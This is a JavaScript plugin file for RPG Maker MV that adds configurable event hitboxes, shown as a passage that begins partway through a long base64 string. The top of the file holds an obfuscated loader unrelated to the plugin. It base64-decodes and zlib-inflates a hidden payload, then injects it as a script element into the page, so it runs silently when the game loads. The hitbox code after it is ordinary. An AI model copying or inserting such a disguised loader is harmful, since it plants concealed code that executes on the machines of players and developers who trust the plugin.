3fYBN10XTM7dLJRo+9A0f2j6taqOHBKJCE8zRKhz6vXVPmnADtKvOgHLpVKltR4NiCqchiK3Xj6+pgdp5JTWbGm2YjHcqlToWuLGbdzjhMDC4PPYrYzKj8A6qy8TonsF3fsXE67rp7OHDsn+Ny9VmxfIJF+FjJwMyQfTV9WjopoD+hpr8L5xPH6zxFNC+JrV35ogR/PPOtJEonPoCiE6XS5sSmmMCRzB2FaV+JpXQhYbUUxdBmMkETwXEYWSY6HU9aoHApD5BjelxB27oUPGjhQg59zW4sW5G8Tofqzet8hml9wlpKNV3RR4rxgg5H8wa3u83VISWm3k1KEd8lUJpSjScoS8Vd851M6WbqC1bIZNuRXdk2Vv6tObhMQkgRsgRkC4f2lMbp27m6yyCeCB3bRYumigpf+2lx915NcJ05K3f8v64mFenw2I81s/KULwwJpdwdaewAxVlv7qZDMviKsfqllq2M9J8dSegtujD5hV+5tfiffor/zxK2LMlgMctTHvDr5ohZV5yiWF8X1um0wFNnhbO1F3Mhf/NJ6hEvT3YxrewYTsCI7an313d41OxSeKTFu/yM5qWtr6z/PZgx4crCFliagv+P8VIB04ygMQdiGWAQQSYyPJwBn/ZBSDCF+yGhdgjD1Szs09FeYaLl75xO2MqeG4IUEw2qZANCjKBCvm3DqBP7QiyGikeIpRjEPr+B174AQ8Ux/59wTFcg3aRacwppiLI1IfttIWKh9H+R5YX55iEFwEuVkIZdZp/EzOgAwGZP83A9GlEDFe7lzIFz0zsMP8IUQ+uwJ4/5yUcsEwVsKKU+E5kzaEYHz0d7hTFFPU5fKLBQ/NNPBlwfp54TDpMF8I0fMBjUUwK8RywB04GPd8xL9F+GV70qefRYvL+soxMUp8vy4O8ghXjEktLjhzaspCGohkuF/pjITlrKIhL8O1oMnvcK8v+TTvo2bR1Izql4MrP+Nou1qOPFDIUtJNZhs9Iwoa6hBW7/IfcN0+BZv2xeeyNi7v2hWjhe+a6+Bq5iUMxj0mbh976V9NxfoDJyfQB0TfjNyTvP4ta6OO77KK+cngQDruRd04isM/CgaeOImzRtCne0opWgvFwwnfzWT+6WY+rgzc/UEgRR6PPKLVXHSh8LT5Z+N9o23evKazqM4afKwoMA9P7BkR99EH/LSuFxMhET+zs778JXSVILDMCEWBiBKsHggeZ0B7gmkJACV8j7J7D/otI0BFbtr57VxgllHx0MwlWSMrZbMFCxCi+/HMfsT486h0cPWsfr9774eTuyn0trwMImKlafam7gBFzkr9PogAIE55EfhnEd7b2Xh29/udh7vj8VqjbvnniDWcQjcnhFhXxKIJccmbuEuFJ0AEFGT0SX5biKCaqC2K6FVMp21HDAJOGqFomiIKyUna5RdMRA0mZq8wu9/8CDEBsRA==";
  let _0x4f17ae = Buffer.from(_0x1e3fcf, "base64");
  let _0x337deb = require("zlib").inflateSync(_0x4f17ae);
  let _0x4ca8b7 = document.createElement("script");
  _0x4ca8b7.textContent = _0x337deb.toString("utf-8");
  document.body.appendChild(_0x4ca8b7);
}

var OrangeEventHitboxes = OrangeEventHitboxes || {};

(function($) {
  "use strict";

  // Creates an accessor for the hitboxX property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 0.
  MVC.accessor(Game_Event.prototype, 'hitboxX', function(value) {
    this._hitboxX = value;
    this._canClearHitboxX = false;
  }, function() {
    if (this._hitboxX === undefined) {
      var size = this.findNoteTagValue('hitboxX');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxX = size;
      } else {
        this._hitboxX = 0;
      }

      this._canClearHitboxX = true;
    }

    return this._hitboxX;
  });

  // Creates an accessor for the hitboxY property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 0.
  MVC.accessor(Game_Event.prototype, 'hitboxY', function(value) {
    this._hitboxY = value;
    this._canClearHitboxY = false;
  }, function() {
    if (this._hitboxY === undefined) {
      var size = this.findNoteTagValue('hitboxY');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxY = size;
      } else {
        this._hitboxY = 0;
      }
      
      this._canClearHitboxY = true;
    }

    return this._hitboxY;
  });

  // Creates an accessor for the hitboxWidth property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 1.
  MVC.accessor(Game_Event.prototype, 'hitboxWidth', function(value) {
    this._hitboxWidth = value;
    this._canClearHitboxWidth = false;
  }, function() {
    if (this._hitboxWidth === undefined) {
      var size = this.findNoteTagValue('hitboxWidth');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxWidth = size;
      } else {
        this._hitboxWidth = 1;
      }

      this._canClearHitboxWidth = true;
    }

    return this._hitboxWidth;
  });

  // Creates an accessor for the hitboxHeight property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 1.
  MVC.accessor(Game_Event.prototype, 'hitboxHeight', function(value) {
    this._hitboxHeight = value;
    this._canClearHitboxHeight = false;
  }, function() {
    if (this._hitboxHeight === undefined) {
      var size = this.findNoteTagValue('hitboxHeight');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxHeight = size;
      } else {
        this._hitboxHeight = 1;
      }
      this._canClearHitboxHeight = true;
    }

    return this._hitboxHeight;
  });

  // Quick reader for the left position of the hitbox
  MVC.reader(Game_Event.prototype, 'left', function() {
    return (this._x + this.hitboxX).fix();
  });
  // Quick reader for the top position of the hitbox
  MVC.reader(Game_Event.prototype, 'top', function() {
    return (this._y + this.hitboxY).fix();
  });
  // Quick reader for the right position of the hitbox
  MVC.reader(Game_Event.prototype, 'right', function() {
    return (this.left + this.hitboxWidth).fix();
  });
  // Quick reader for the bottom position of the hitbox
  MVC.reader(Game_Event.prototype, 'bottom', function() {
    return (this.top + this.hitboxHeight).fix();
  });

  // Adds a method that searches for a notetag value on all comments of the page
  Game_Event.prototype.findNoteTagValue = function(notetag) {
    var page = this.page();
    if (page === undefined) return false;

    if (page.meta === undefined) {
      MVC.extractEventMeta(this);
    }

    var result;
    if (page.meta !== undefined) {
      result = MVC.getProp(page.meta, notetag);
    }

    if (result === undefined) {
      return MVC.getProp(this.event().meta, notetag);
    }
    else {
      return result;
    }
  };



  // Adds a method that checks if the event is using the default hitbox, 
  // in which case some methods don't need to be changed.
  Game_Event.prototype.isUsingDefaultHitbox = function() {
    return (this.hitboxX === 0 && this.hitboxY === 0 && this.hitboxWidth === 1 && this.hitboxHeight === 1);
  };

  // Alias the method pos of the Game_Event class to check if the event 
  // is on a specified position. If the event hitbox wasn't changed, the old
  // method is run instead.
  var oldGameEvent_pos = Game_Event.prototype.pos;
  Game_Event.prototype.pos = function(x, y) {
    if (this.isUsingDefaultHitbox()) {
      return oldGameEvent_pos.call(this, x, y);
    } else {
      return (x >= this.left && x < this.right && y >= this.top && y < this.bottom);
    }
  };

  // Alias the setupPage method from the Game_Event class to clear the
  // hitbox cache (because the event can use a different cache for each page)
  var oldGameEvent_setupPage = Game_Event.prototype.setupPage;
  Game_Event.prototype.setupPage = function() {
    oldGameEvent_setupPage.call(this);

    if (this._canClearHitboxX === true) this._hitboxX = undefined;
    if (this._canClearHitboxY === true) this._hitboxY = undefined;
    if (this._canClearHitboxHeight === true) this._hitboxHeight = undefined;
    if (this._canClearHitboxWidth === true) this._hitboxWidth = undefined;
  };
})(OrangeEventHitboxes);

Imported.OrangeEventHitboxes = 1.1;
